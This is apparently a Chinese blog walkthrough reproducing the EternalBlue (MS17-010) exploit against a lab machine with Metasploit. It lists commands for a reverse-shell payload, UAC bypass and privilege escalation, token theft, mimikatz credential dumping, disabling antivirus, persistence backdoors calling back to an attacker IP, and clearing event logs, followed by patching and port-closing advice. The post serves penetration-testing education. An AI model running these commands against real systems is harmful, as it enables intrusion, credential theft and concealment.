+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639287954277.png" alt="漏洞扫描"></p>
+<p>通过漏洞扫描模块扫描后得出结果，此系统易受到永恒之蓝漏洞攻击</p>
+<h1 id="漏洞攻击阶段"><a href="#漏洞攻击阶段" class="headerlink" title="漏洞攻击阶段"></a>漏洞攻击阶段</h1><blockquote>
+<p>使用ms17-010攻击模块，对靶机进行攻击<br><code>search ms17-010----&gt;use id</code></p>
+</blockquote>
+<h3 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h3><blockquote>
+<p><code>show options</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639306568136.png" alt="参数的查看"><br>需要设置目标主机的IP地址</p>
+<h3 id="设定参数"><a href="#设定参数" class="headerlink" title="设定参数"></a>设定参数</h3><blockquote>
+<p><code>set rhost 192.168.21.154</code></p>
+</blockquote>
+<h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><blockquote>
+<p><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>注：如果没有设置payload,使用上漏洞只是回弹shell，使用后回弹meterpreter。</p>
+</blockquote>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308549675.png" alt="payload"></p>
+<h3 id="run-获得权限"><a href="#run-获得权限" class="headerlink" title="run-&gt;获得权限"></a>run-&gt;获得权限</h3><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308573542.png" alt="得到shell"></p>
+<h1 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h1><blockquote>
+<p>一般在获得shell后即进入后渗透阶段。后渗透攻击，顾名思义就是漏洞利用成功后的攻击，即拿到系统权限后的后续操作。后渗透攻击阶段的操作，可分为两种：权限维持和内网渗透。这里主要是就第一个进行测试。</p>
+</blockquote>
+<h2 id="meterpreter的基本系统命令"><a href="#meterpreter的基本系统命令" class="headerlink" title="meterpreter的基本系统命令"></a>meterpreter的基本系统命令</h2><ul>
+<li>sessions    #sessions –h 查看帮助</li>
+<li>sessions -l #列出当前会话</li>
+<li>sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</li>
+<li>background  #将当前会话放置后台</li>
+</ul>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308757484.png" alt="状态切换"></p>
+<ul>
+<li>shell #进入目标机cmd shell</li>
+<li>sysinfo # 查看目标机系统信息</li>
+<li>getuid # 查看权限</li>
+<li>getpid # 获取当前进程的pid</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366204474.png" alt="命令演示1"></p>
+<ul>
+<li>ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366322903.png" alt="命令演示2"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><blockquote>
+<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权</p>
+</blockquote>
+<h3 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h3><blockquote>
+<p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639313241515.png" alt="getsystem"></p>
+<p>一般直接使用getsystem不会成功。</p>
+<blockquote>
+<p>ps:<br>在meterpreter shell界面，我们可以通过shell命令，进入cmd命令提示符，使用<code>net user</code>查看当前用户，发现当前用户实际是在管理组administrators组中，那为什么还提权不了呢？<br>原来，windows操作系统在vista以后增加了一个UAC的功能，英文全称User Access Control，该功能对管理员组的用户起到一定限制，进而保护计算机安全，当我们需要运行一些重要的程序，只有管理员权限才能运行的程序时，UAC功能都会弹出一个对话框，对用户进行询问，当用户点击了同意按钮，程序才会以管理员或system权限运行。因此，我们要想提权成功，首先要绕过windows的UAC限制，接下来我们来看常用的绕过UAC的套路。</p>
+</blockquote>
+<h3 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h3><blockquote>
+<p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限.</p>
+</blockquote>
+<ul>
+<li><code>use exploit/windows/local/bypassuac</code></li>
+<li><code>use exploit/windows/local/bypassuac_injection</code></li>
+<li><code>use windows/local/bypassuac_vbs</code></li>
+<li><code>use windows/local/ask</code></li>
+</ul>
+<p>下面以其中一个举例：（其他几个操作类似）<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367106726.png" alt="使用模块"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367188142.png" alt="getsystem成功"></p>
+<h3 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h3><blockquote>
+<p>这种方法可以利用<code>exploit/windows/local/ask模块</code>，但是该模块实际上只是以高权限重启一个返回式shellcode,并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell(需要执行getsystem)。</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317929928.png" alt="set信息"><br>注：我们可以把name改为windows_updata.exe迷惑操作者。</p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317543810.png" alt="靶机弹窗"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639318047407.png" alt="getsystem"></p>
+<h3 id="利用windows提权漏洞进行提权"><a href="#利用windows提权漏洞进行提权" class="headerlink" title="利用windows提权漏洞进行提权"></a>利用windows提权漏洞进行提权</h3><blockquote>
+<p>上述getsystem提权需要用户在管理组，如果不是，就需要使用其他方法提权。这里介绍利用已有的漏洞进行提权。</p>
+</blockquote>
+<ul>
+<li><p>这里先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p>
+</li>
+<li><p>meterpreter &gt; <code>run post/windows/gather/enum_patches</code>  #查看补丁信息</p>
+</li>
+<li><p>msf &gt; <code>use exploit/windows/local/ms13_053_schlamperei</code>  #使用具体的exp,根据列出的具体可用exp而定</p>
+</li>
+<li><p>msf &gt; <code>set SESSION 2   </code></p>
+</li>
+<li><p>msf &gt; <code>exploit</code></p>
+<ol start="2">
+<li>也可以使用local_exploit_suggester进行查询哪些exp可以用.</li>
+</ol>
+</li>
+<li><p><code>use post/multi/recon/local_exploit_suggester</code></p>
+</li>
+<li><p><code>set session i</code></p>
+</li>
+<li><p><code>set lhost 192.168.xxx.xxx</code></p>
+</li>
+<li><p><code>run</code></p>
+</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639368455537.png" alt="查询"></p>
+<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><blockquote>
+<p>另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展.</p>
+</blockquote>
+<ul>
+<li><code>use incognito </code>     							#help incognito  查看帮助</li>
+<li><code>list_tokens -u </code>  							#查看可用的token</li>
+<li><code>impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;</code> 		#假冒SYSTEM token</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370391327.png" alt="假冒token"></p>
+<ul>
+<li><code>list_tokens -g</code> #列出目标主机用户组的可用令牌</li>
+</ul>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370584443.png" alt="用户组可用令牌"></p>
+<ul>
+<li>meterpreter &gt;<code>execute -f cmd.exe -i -t</code> #调用域权限shell</li>
+<li><code>chcp 65001</code> #UTF-8编码代码页，解决乱码</li>
+<li>meterpreter &gt; <code>getuid</code></li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370812087.png" alt="shell"></p>
+<ul>
+<li><code>steal_token </code>	#从指定进程中窃取token   先ps列出可用的值</li>
+<li><code>drop_token</code>			#删除窃取的token</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371086237.png" alt="进程"></p>
+<ul>
+<li><p><code>rev2self </code>  			#返回原始token</p>
+</li>
+<li><p><code>migrate+pid </code>  #将当前会话进程迁移到一个指定的进程ID<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371481362.png" alt="进程迁移"></p>
+</li>
+</ul>
+<h2 id="后续提权操作"><a href="#后续提权操作" class="headerlink" title="后续提权操作"></a>后续提权操作</h2><h3 id="基本信息搜集"><a href="#基本信息搜集" class="headerlink" title="基本信息搜集"></a>基本信息搜集</h3><ol>
+<li>检测是否为虚拟机<blockquote>
+<p><code>run post/windows/gather/checkvm</code> #是否虚拟机</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309037371.png" alt="是否运行在虚拟机"></p>
+<ol start="2">
+<li>关闭杀毒软件<blockquote>
+<p><code>run killav </code></p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309117079.png" alt="关闭杀毒软件"></p>
+<ol start="3">
+<li>获取安装软件信息<blockquote>
+<p><code>run post/windows/gather/enum_applications</code> #获取安装软件信息</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372062857.png" alt="软件信息"></p>
+<ol start="4">
+<li>获取最近的文件操作<blockquote>
+<p><code>run post/windows/gather/dumplinks</code>   #获取最近的文件操作</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372106444.png" alt="文件操作"></p>
+<ol start="5">
+<li>列举登录过的用户</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309269151.png" alt="列举登录过的用户"></p>
+<h3 id="hash与明文密码读取"><a href="#hash与明文密码读取" class="headerlink" title="hash与明文密码读取"></a>hash与明文密码读取</h3><ul>
+<li><code>load mimikatz</code>    #help mimikatz 查看帮助</li>
+<li><code> wdigest</code>  #获取Wdigest密码</li>
+<li><code>mimikatz_command -f samdump::hashes</code>  #执行mimikatz原始命令</li>
+<li><code>mimikatz_command -f sekurlsa::searchPasswords</code></li>
+<li><code>run post/windows/gather/smart_hashdump</code>  #从SAM导出密码哈希需要SYSTEM权限</li>
+</ul>
+<h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><ul>
+<li>getwd 或者pwd # 查看当前工作目录  </li>
+<li>ls</li>
+<li>cd</li>
+<li><code>search -f *pass* </code>     # 搜索文件  -h查看帮助</li>
+<li>cat c:\lltest\lltestpasswd.txt  # 查看文件内容</li>
+<li><code>upload /tmp/hack.txt C:\\lltest </code> # 上传文件到目标机上</li>
+<li><code>download c:\\lltest\\lltestpasswd.txt /tmp/ </code># 下载文件到本机上</li>
+<li>edit c:\1.txt #编辑或创建文件  没有的话，会新建文件</li>
+<li>rm C:\lltest\hack.txt</li>
+<li><code>mkdir lltest2 </code> #只能在当前目录下创建文件夹</li>
+<li><code>rmdir lltest2</code>  #只能删除当前目录下文件夹</li>
+<li>getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</li>
+<li>lcd &#x2F;tmp   #操作攻击者主机 切换目录</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
+<p>信息收集的脚本位于：<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639373652409.png" alt="脚本位置"></p>
+<ul>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
+<li>run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</li>
+</ul>
+<h2 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h2><blockquote>
+<p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
+</blockquote>
+<h3 id="启动项植入"><a href="#启动项植入" class="headerlink" title="启动项植入"></a>启动项植入</h3><ul>
+<li>run persistence –h  #查看帮助</li>
+<li>run persistence -X -i 5 -p 6661 -r 192.168.159.134 #-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374019249.png" alt="后门1"></p>
+<p>后门的连接：</p>
+<ul>
+<li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
+<li>msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
+<li>msf &gt; set LHOST 192.168.159.134</li>
+<li>msf &gt; set LPORT 6661</li>
+<li>msf &gt; exploit</li>
+</ul>
+<p> 也可以自己生成被控端，而后通过upload指令将其放到靶机的启动目录。</p>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320429265.png" alt="被控端生成"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320736490.png" alt="主控端"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320789421.png" alt="靶机运行"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639321161778.png" alt="连接成功"></p>
+<h3 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h3><blockquote>
+<p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>
+</blockquote>
+<ul>
+<li>run metsvc –h   # 查看帮助</li>
+<li>run metsvc –A   #自动安装后门</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374688570.png" alt="服务后门"></p>
+<ul>
+<li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
+<li>msf &gt; set payload windows&#x2F;metsvc_bind_tcp</li>
+<li>msf &gt; set RHOST 192.168.159.144</li>
+<li>msf &gt; set RPORT 31337</li>
+<li>msf &gt; exploit</li>
+</ul>
+<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><blockquote>
+<p><code>run event_manager -c</code>    #清除目标系统的事件日志</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639375334920.png" alt="痕迹清理"></p>
+<h1 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h1><p>报告是渗透测试过程中最为重要的因素，使用报告文档来交流在渗透测试过程中做了哪些，如何做的，以及最为重要的—-客户组织如何修复所发现的安全漏洞和弱点。</p>
+<p>永恒之蓝漏洞的修复与防范：</p>
+<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><ol>
+<li><p>为计算机安装最新的安全补丁，微软已发布补丁MS17-010修复了“永恒之蓝”攻击的系统漏洞，请尽快安装此安全补丁，网址为Microsoft 安全公告 MS17-010 - 严重 | Microsoft Docs。</p>
+</li>
+<li><p>及时备份，一定要离线备份重要文件</p>
+</li>
+<li><p>开启防火墙</p>
+</li>
+<li><p>关闭445、135、137、138、139端口，关闭网络共享。</p>
+</li>
+</ol>
+<h4 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h4><blockquote>
+<p>445端口：在局域网中轻松访问各种共享文件夹或共享打印机</p>
+</blockquote>
+<ol>
+<li>WIN+R 运行–regedit</li>
+<li>找到注册表项“HKEY_LOCAL_MACHINE\System\Controlset\Services\NetBT\Parameters”		   </li>
+<li>选择“Parameters”项，右键单击，选择“新建”——“DWORD值”。(64位  32位根据自己需求)</li>
+<li>将DWORD值重命名为“SMBDeviceEnabled”</li>
+<li>修改”数值数据”的值为0,点击确定，完成设置</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376468455.png" alt="关闭445"></p>
+<h4 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h4><blockquote>
+<p>135端口：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。</p>
+</blockquote>
+<ol>
+<li>WIN+R 运行–dcomcnfg</li>
+<li>在弹出的“组件服务”对话框中，选择“计算机”选项。</li>
+<li>右键单击”我的电脑”，选择”属性” </li>
+<li>在”默认属性”选项卡中，去掉”在此计算机上启用分布式COM”前的勾。</li>
+<li>选择”默认协议”选项卡，选中”面向连接的TCP&#x2F;IP”，单击”移除”按钮。</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376646107.png" alt="关闭135"></p>
+<p>　</p>
+<h4 id="关闭137、138、139端口"><a href="#关闭137、138、139端口" class="headerlink" title="关闭137、138、139端口"></a>关闭137、138、139端口</h4><blockquote>
+<p>137、138端口：137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS&#x2F;SMB服务</p>
+</blockquote>
+<ol>
+<li>打开网络共享中心 – 更改适配器设置</li>
+<li>右键点击属性，把框起来的选项前面的勾去掉，然后卸载</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376806506.png" alt="1"></p>
+<ol start="3">
+<li>双击Internet 协议版本 4 (TCP&#x2F;IPv4)– 高级–选择WIN</li>
+<li>勾选禁用TCP&#x2F;IP上的NetBIOS(S)<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376885411.png" alt="2"></li>
+</ol>
+<p>做完以上操作 重启即可关闭端口</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>如果中招 已经被勒索，建议360网址下载查杀工具：<a target="_blank" rel="noopener" href="http://dl.360safe.com/nsa/nsatool.exe">http://dl.360safe.com/nsa/nsatool.exe</a></p>
+<p>到卡巴斯基下载文件解锁工具：<a target="_blank" rel="noopener" href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com/</a></p>
+<ol>
+<li>打开自己的那个勒索软件界面，点击copy. （复制黑客的比特币地址）</li>
+<li>把copy粘贴到btc.com （区块链查询器）</li>
+<li>在区块链查询器中找到黑客收款地址的交易记录，然后随意选择一txid（交易哈希值）</li>
+<li>把txid 复制粘贴给 勒索软件界面按钮connect us.</li>
+<li>等黑客看到后 你再点击勒索软件上的check payment.</li>
+<li>再点击decrypt 解密文件即可。</li>
+<li>解锁软件：<a target="_blank" rel="noopener" href="https://github.com/QuantumLiu/antiBTCHack">https://github.com/QuantumLiu/antiBTCHack</a></li>
+<li>实际上并不是物理解密文件</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>danggeOvO
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://danggeovo.github.io/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/" title="永恒之蓝漏洞复现（流程模拟）">https://danggeovo.github.io/2023/03/29/永恒之蓝漏洞复现（流程模拟）/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/25/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862--%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3/" rel="prev" title="基础知识--激活函数相关">
+                  <i class="fa fa-angle-left"></i> 基础知识--激活函数相关
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/" rel="next" title="xss攻击测试">
+                  xss攻击测试 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">danggeOvO</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">337k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:13</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+
+</body>
+</html>
